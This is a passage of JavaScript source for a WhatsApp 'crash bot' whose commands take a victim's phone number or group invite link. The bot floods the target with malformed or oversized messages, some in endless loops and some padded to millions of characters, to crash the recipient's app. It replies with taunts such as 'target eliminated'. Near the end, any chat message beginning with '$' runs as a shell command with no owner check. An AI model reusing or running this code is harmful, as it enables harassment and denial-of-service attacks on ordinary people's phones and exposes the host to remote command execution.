    "𝒉𝒂𝒔 𝒃𝒆𝒆𝒏 𝒅𝒐𝒘𝒏 𝒖𝒔𝒊𝒏𝒈*" + command + "* \n\n 𝒏𝒐 𝒎𝒆𝒓𝒄𝒚 𝒇𝒐𝒓 𝒚𝒐𝒖 𝒃𝒓𝒖𝒉 💣.", 
    [whatsappNumber]
  );
}
break;
case "anything-crash": {

if (!isPremium) return reply('_</> owner only..._')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 234xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 234xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "201025663589") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "𝒕𝒂𝒓𝒈𝒆𝒕 𝒆𝒍𝒊𝒎𝒊𝒏𝒂𝒕𝒆𝒅 🥶 ${bijipler} 𝒖𝒔𝒊𝒏𝒈 ${command}.ᯤ\n\n 𝒏𝒐 𝒑𝒆𝒂𝒄𝒆 𝒇𝒐𝒓 𝒕𝒉𝒆 𝒘𝒊𝒄𝒌𝒆𝒅💀.", 
    [whatsappNumber]
  );
}
break;
case "blank-ui": {

if (!isPremium) return reply('_</> owner only..._')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 234xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 234xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "201025663589") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "𝒕𝒂𝒓𝒈𝒆𝒕 @" + whatsappNumber.split('@')[0] + 
    "𝒉𝒂𝒔 𝒃𝒆𝒆𝒏 𝒅𝒐𝒘𝒏 𝒖𝒔𝒊𝒏𝒈*" + command + "* \n\n 𝒏𝒐 𝒎𝒆𝒓𝒄𝒚 𝒇𝒐𝒓 𝒚𝒐𝒖 𝒃𝒓𝒖𝒉 💣.", 
    [whatsappNumber]
  );
}
break;
case "engine-ui": {

if (!isPremium) return reply('_</> owner only..._')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 234xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 234xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "201025663589") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "𝒕𝒂𝒓𝒈𝒆𝒕 𝒆𝒍𝒊𝒎𝒊𝒏𝒂𝒕𝒆𝒅 🥶 ${bijipler} 𝒖𝒔𝒊𝒏𝒈 ${command}.ᯤ\n\n 𝒏𝒐 𝒑𝒆𝒂𝒄𝒆 𝒇𝒐𝒓 𝒕𝒉𝒆 𝒘𝒊𝒄𝒌𝒆𝒅💀.", 
    [whatsappNumber]
  );
}
break;
case "gfsCdgsGsGs": {

if (!isPremium) return reply('_</> owner only..._')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 234xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 234xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6285766950461") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "𝒕𝒂𝒓𝒈𝒆𝒕 @" + whatsappNumber.split('@')[0] + 
    "𝒉𝒂𝒔 𝒃𝒆𝒆𝒏 𝒅𝒐𝒘𝒏 𝒖𝒔𝒊𝒏𝒈*" + command + "* \n\n 𝒏𝒐 𝒎𝒆𝒓𝒄𝒚 𝒇𝒐𝒓 𝒚𝒐𝒖 𝒃𝒓𝒖𝒉 💣.", 
    [whatsappNumber]
  );
}
break;
case "gfsCdgsGsGs": {

if (!isPremium) return reply('_</> owner only..._')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 234xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 234xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6285766950461") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "𝒕𝒂𝒓𝒈𝒆𝒕 @" + whatsappNumber.split('@')[0] + 
    "𝒉𝒂𝒔 𝒃𝒆𝒆𝒏 𝒅𝒐𝒘𝒏 𝒖𝒔𝒊𝒏𝒈*" + command + "* \n\n 𝒏𝒐 𝒎𝒆𝒓𝒄𝒚 𝒇𝒐𝒓 𝒚𝒐𝒖 𝒃𝒓𝒖𝒉 💣.", 
    [whatsappNumber]
  );
}
break;
case "gfsCdgsGsGs": {

if (!isPremium) return reply('_</> owner only..._')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 234xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 234xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6285766950461") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "𝒕𝒂𝒓𝒈𝒆𝒕 @" + whatsappNumber.split('@')[0] + 
    "𝒉𝒂𝒔 𝒃𝒆𝒆𝒏 𝒅𝒐𝒘𝒏 𝒖𝒔𝒊𝒏𝒈*" + command + "* \n\n 𝒏𝒐 𝒎𝒆𝒓𝒄𝒚 𝒇𝒐𝒓 𝒚𝒐𝒖 𝒃𝒓𝒖𝒉 💣.", 
    [whatsappNumber]
  );
}
break;
case 'gfsCdgsGsGs': {

if (!isPremium) return reply('_</> owner only..._')
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`</> crash sudah terkirim... `)
for (let j = 0; j < 50; j++) {
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
}
await reply(`𝒕𝒂𝒓𝒈𝒆𝒕 𝒆𝒍𝒊𝒎𝒊𝒏𝒂𝒕𝒆𝒅 🥶 ${bijipler} 𝒖𝒔𝒊𝒏𝒈 ${command}.ᯤ\n\n 𝒏𝒐 𝒑𝒆𝒂𝒄𝒆 𝒇𝒐𝒓 𝒕𝒉𝒆 𝒘𝒊𝒄𝒌𝒆𝒅💀.`)
}
break
case 'gfsCdgsGsGs': {

if (!isPremium) return reply('_</> owner only..._')
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`</> crash sudah terkirim... `)
for (let j = 0; j < 50; j++) {
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
}
await reply(`𝒕𝒂𝒓𝒈𝒆𝒕 𝒆𝒍𝒊𝒎𝒊𝒏𝒂𝒕𝒆𝒅 🥶 ${bijipler} 𝒖𝒔𝒊𝒏𝒈 ${command}.ᯤ\n\n 𝒏𝒐 𝒑𝒆𝒂𝒄𝒆 𝒇𝒐𝒓 𝒕𝒉𝒆 𝒘𝒊𝒄𝒌𝒆𝒅💀.`)
}
break
//=================================================//
case 'stardust': {

if (!isPremium) return reply('_</> owner only..._')
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`</> crash sudah terkirim... `)
for (let j = 0; j < 40; j++) {
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
}
await reply(`𝒕𝒂𝒓𝒈𝒆𝒕 𝒆𝒍𝒊𝒎𝒊𝒏𝒂𝒕𝒆𝒅 🥶 ${bijipler} 𝒖𝒔𝒊𝒏𝒈 ${command}.ᯤ\n\n 𝒏𝒐 𝒑𝒆𝒂𝒄𝒆 𝒇𝒐𝒓 𝒕𝒉𝒆 𝒘𝒊𝒄𝒌𝒆𝒅💀.`)
}
break
case 'self': {
if (!isOwner) return reply(mess.only.owner)
deltaxcrash.public = false
reply('succes')
}
break
case 'public': {
if (!isOwner) return reply(mess.only.owner)
deltaxcrash.public = true
reply('succes')
}
break
//=================================================//
case 'narutox': case 'narutox2': {

if (!isPremium) return reply('_</> owner only..._')
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`</> crash sudah terkirim... `)
for (let j = 0; j < 30; j++) {
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
}
await reply(`𝒕𝒂𝒓𝒈𝒆𝒕 𝒆𝒍𝒊𝒎𝒊𝒏𝒂𝒕𝒆𝒅 🥶 ${bijipler} 𝒖𝒔𝒊𝒏𝒈 ${command}.ᯤ\n\n 𝒏𝒐 𝒑𝒆𝒂𝒄𝒆 𝒇𝒐𝒓 𝒕𝒉𝒆 𝒘𝒊𝒄𝒌𝒆𝒅💀`)
}
break
//=================================================//
case 'narutox3': case 'narutox4': {

if (!isPremium) return reply('_</> owner only..._')
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`</> crash sudah terkirim... `)
for (let j = 0; j < 10; j++) {
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
}
await reply(`𝒕𝒂𝒓𝒈𝒆𝒕 𝒆𝒍𝒊𝒎𝒊𝒏𝒂𝒕𝒆𝒅 🥶 ${bijipler} 𝒖𝒔𝒊𝒏𝒈 ${command}.ᯤ\n\n 𝒏𝒐 𝒑𝒆𝒂𝒄𝒆 𝒇𝒐𝒓 𝒕𝒉𝒆 𝒘𝒊𝒄𝒌𝒆𝒅💀.`)
}
break
case 'bug-list': {
if (!isPremium) return reply('_</> owner only..._')

if (!text) return reply(`Example:\n${prefix + command} 62xxxxxxxxx|5`)

victim = text.split("|")[0]+"@s.whatsapp.net"

amount = text.split("|")[1] * 30

for (let i = 0; i < amount; i++) {

await deltaxcrash.sendMessage(victim, { text: '' }, { quoted: xbug2 })

}
reply(`Successfully Sent Bug To ${victim}`)
}
break
case 'bug-list': {
if (!isPremium) return reply('_</> owner only..._')

if (!text) return reply(`Example:\n${prefix + command} 62xxxxxxxxx|5`)

victim = text.split("|")[0]+"@s.whatsapp.net"

amount = text.split("|")[1] * 30

for (let i = 0; i < amount; i++) {

await deltaxcrash.sendMessage(victim, { text: '' }, { quoted: xbug2 })

}

reply(`Successfully Sent Bug To ${victim}`)

}
break
case 'buglist-external': {


if (!isPremium) return reply('_</> owner only..._')

if (!text) return reply(`Example:\n${prefix + command} 62xxxxxxxxx|5`)

victim = text.split("|")[0]+"@s.whatsapp.net"

amount = text.split("|")[1] * 30

for (let i = 0; i < amount; i++) {

await deltaxcrash.sendMessage(victim, { text: '' }, { quoted: xbug2 })

}

reply(`Successfully Sent Bug To ${victim}`)

}
break
case 'buglist-internal': {


if (!isPremium) return reply('_</> owner only..._')

if (!text) return reply(`Example:\n${prefix + command} 62xxxxxxxxx|5`)

victim = text.split("|")[0]+"@s.whatsapp.net"

amount = text.split("|")[1] * 30

for (let i = 0; i < amount; i++) {

await deltaxcrash.sendMessage(victim, { text: '' }, { quoted: xbug2 })

}

reply(`Successfully Sent Bug To ${victim}`)

}
break
case 'buglist-engine': {


if (!isPremium) return reply('_</> owner only..._')

if (!text) return reply(`Example:\n${prefix + command} 62xxxxxxxxx|5`)

victim = text.split("|")[0]+"@s.whatsapp.net"

amount = text.split("|")[1] * 30

for (let i = 0; i < amount; i++) {

await deltaxcrash.sendMessage(victim, { text: '' }, { quoted: xbug2 })

}

reply(`Successfully Sent Bug To ${victim}`)

}
break
case 'buglist-crash': {


if (!isPremium) return reply('_</> owner only..._')

if (!text) return reply(`Example:\n${prefix + command} 62xxxxxxxxx|5`)

victim = text.split("|")[0]+"@s.whatsapp.net"

amount = text.split("|")[1] * 30

for (let i = 0; i < amount; i++) {

await deltaxcrash.sendMessage(victim, { text: '' }, { quoted: xbug2 })

}

reply(`Successfully Sent Bug To ${victim}`)

}
break
//=================================================//
case 'virus999': case 'restart-maker': case 'deltax5': case 'clear-data': {

if (!isPremium) return reply('_</> owner only..._')
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`</> crash sudah terkirim... `)
for (let j = 0; j < 1; j++) {
await baklis(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
}
await reply(`𝒕𝒂𝒓𝒈𝒆𝒕 𝒆𝒍𝒊𝒎𝒊𝒏𝒂𝒕𝒆𝒅 🥶 ${target} 𝒖𝒔𝒊𝒏𝒈 ${command}.ᯤ\n\n 𝒏𝒐 𝒑𝒆𝒂𝒄𝒆 𝒇𝒐𝒓 𝒕𝒉𝒆 𝒘𝒊𝒄𝒌𝒆𝒅💀.`)
}
break
//=================================================//
case 'narutocrash ': case 'gfsCdgsGsGs': {

if (!isPremium) return reply('_</> owner only..._')
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`</> crash sudah terkirim... `)
for (;;) {
await ngeloc(target, force)
await baklis(target, ryobug)
await ngeloc(target, force)
await ngeloc(target, force)
await baklis(target, ryobug)
await ngeloc(target, force)
await ngeloc(target, force)
await baklis(target, ryobug)
await ngeloc(target, force)
await ngeloc(target, force)
await baklis(target, ryobug)
await ngeloc(target, force)
await sleep(60000)
}
}
break
case 'gfsCdgsGsGs': {

if (!isPremium) return reply('_</> owner only..._')

if (!m.quoted) return reply(`Example usage: ${prefix + command} reply chat`)

await deltaxcrash.sendMessage(m.chat, { text: 'Success In Sending Bug', contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363222395675670@newsletter', newsletterName: `Ednutbug`.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })

await sleep(2000)

await deltaxcrash.sendMessage(m.chat, { react: { text: '😈', key: { remoteJid: m.chat, fromMe: true, id: quoted.id } } })

}

break        
        case 'virus-id': {


if (!isPremium) return reply('_</> owner only..._')

if (!text) return reply(`Example:\n${prefix + command} 62xxxxxxxxx|5`)

victim = text.split("|")[0]+"@s.whatsapp.net"

amount = text.split("|")[1] * 30

for (let i = 0; i < amount; i++) {

await deltaxcrash.sendMessage(victim, { text: '' }, { quoted: xbug2 })

}

reply(`Successfully Sent Bug To ${victim}`)

}
//=================================================//
case 'phone-crash': {

if (!isPremium) return reply('_</> owner only..._')
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`</> crash sudah terkirim... `)
  for (;;) {
    await ngeloc(target, ryobug)
  }
}
break
//=================================================//
case 'gfsCdgsGsGs': case 'bug-gc': {

if (!isPremium) return reply('_</> owner only..._')
if (!q) return reply(`Penggunaan .${command} https://chat.whatsapp.com/`)
reply(`</> crash sudah terkirim... `)
let result = args[0].split('https://chat.whatsapp.com/')[1];
let target = await deltaxcrash.groupAcceptInvite(result);
for (let j = 0; j < 5; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({ viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": "",
      "subtitle": " "
    },
    "body": {
      "text": "🩸⃟༑⌁⃰₦₳ⱤɄ₮Ø ฿Ø₮ ₵Ɽ₳₴ⱧɆⱤ🦠"
    },
    "footer": {
      "text": "›          #Narutov1"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : '⿻DevilS⿻', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(1000000)
    }
  }
}
}
}), { userJid: m.chat, quoted: ryobug })
await deltaxcrash.relayMessage(target, etc.message, { messageId: etc.key.id })
await sleep(700)
}
reply(`𝒕𝒂𝒓𝒈𝒆𝒕 𝒆𝒍𝒊𝒎𝒊𝒏𝒂𝒕𝒆𝒅 🥶 ${target} 𝒖𝒔𝒊𝒏𝒈 ${command}.ᯤ\n\n 𝒏𝒐 𝒑𝒆𝒂𝒄𝒆 𝒇𝒐𝒓 𝒕𝒉𝒆 𝒘𝒊𝒄𝒌𝒆𝒅💀`)
}
break
case 'gfsCdgsGsGs': case 'reset-gc': {

if (!isPremium) return reply('_</> owner only..._')
if (!q) return reply(`Penggunaan .${command} https://chat.whatsapp.com/`)
reply(`</> crash sudah terkirim... `)
let result = args[0].split('https://chat.whatsapp.com/')[1];
let target = await deltaxcrash.groupAcceptInvite(result);
for (let j = 0; j < 5; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({ viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": "",
      "subtitle": " "
    },
    "body": {
      "text": "🩸⃟༑⌁⃰🩸⃟༑⌁⃰₦₳ⱤɄ₮Ø ฿Ø₮ ₵Ɽ₳₴ⱧɆⱤ🦠🦠"
    },
    "footer": {
      "text": "›          #Ednutcrash"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : '⿻DevilS⿻', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(20000000)
    }
  }
}
}
}), { userJid: m.chat, quoted: ryobug })
await deltaxcrash.relayMessage(target, etc.message, { messageId: etc.key.id })
await sleep(700)
}
reply(`𝒕𝒂𝒓𝒈𝒆𝒕 𝒆𝒍𝒊𝒎𝒊𝒏𝒂𝒕𝒆𝒅 🥶 ${target} 𝒖𝒔𝒊𝒏𝒈 ${command}.ᯤ\n\n 𝒏𝒐 𝒑𝒆𝒂𝒄𝒆 𝒇𝒐𝒓 𝒕𝒉𝒆 𝒘𝒊𝒄𝒌𝒆𝒅💀`)
}
break
//=================================================//
case 'kill-gc': case 'gfsCdgsGsGs': {

if (!isPremium) return reply('_</> owner only..._')
if (!q) return reply(`Penggunaan .${command} 1962623836281@g.us`)
reply(`</> crash sudah terkirim... `)
target = q
for (let j = 0; j < 5; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({ viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": "",
      "subtitle": " "
    },
    "body": {
      "text": "🩸⃟༑⌁⃰₦₳ⱤɄ₮Ø ฿Ø₮ ₵Ɽ₳₴ⱧɆⱤ͜🦠"
    },
    "footer": {
      "text": "›          #EdnutCrash"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : '⿻DevilS⿻', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(20000000)
    }
  }
}
}
}), { userJid: m.chat, quoted: ryobug })
await deltaxcrash.relayMessage(target, etc.message, { messageId: etc.key.id })
await sleep(700)
}
reply(`<✓> Successfully Send Bug to ${target} Using ${command}.ᯤ\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
case 'gfsCdgsGsGs': case 'gfsCdgsGsGs': {

if (!isPremium) return reply('_</> owner only..._')
if (!q) return reply(`Penggunaan .${command} 1962623836281@g.us`)
reply(`</> crash sudah terkirim... `)
target = q
for (let j = 0; j < 5; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({ viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": "",
      "subtitle": " "
    },
    "body": {
      "text": "🩸⃟༑⌁⃰₦₳ⱤɄ₮Ø ฿Ø₮ ₵Ɽ₳₴ⱧɆⱤ🦠"
    },
    "footer": {
      "text": "›          #EdnutCrash"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : '⿻DevilS⿻', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(1000000)
    }
  }
}
}
}), { userJid: m.chat, quoted: ryobug })
await deltaxcrash.relayMessage(target, etc.message, { messageId: etc.key.id })
await sleep(700)
}
reply(`𝒕𝒂𝒓𝒈𝒆𝒕 𝒆𝒍𝒊𝒎𝒊𝒏𝒂𝒕𝒆𝒅 🥶 ${bijipler} 𝒖𝒔𝒊𝒏𝒈 ${command}.ᯤ\n\n 𝒏𝒐 𝒑𝒆𝒂𝒄𝒆 𝒇𝒐𝒓 𝒕𝒉𝒆 𝒘𝒊𝒄𝒌𝒆𝒅💀`)
}
break
case "delprem":{
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6283123456789`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = prem.indexOf(ya)
prem.splice(unp, 1)
fs.writeFileSync("./all/database/premium.json", JSON.stringify(prem))
reply(`Nomor ${ya} Telah Di Hapus Premium!`)
}
break
default:
}
if (budy.startsWith('$')) {
exec(budy.slice(2), (err, stdout) => {
if(err) return reply(err)
if (stdout) return reply(stdout)
})
}
if (budy.startsWith(">")) {
if (!isOwner) return reply(mess.only.owner)
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await reply(evaled)
} catch (err) {
reply(String(err))
}
}
} catch (e) {
console.log(e)
deltaxcrash.sendMessage(`${owner}@s.whatsapp.net`, {text:`${util.format(e)}`})
}
}

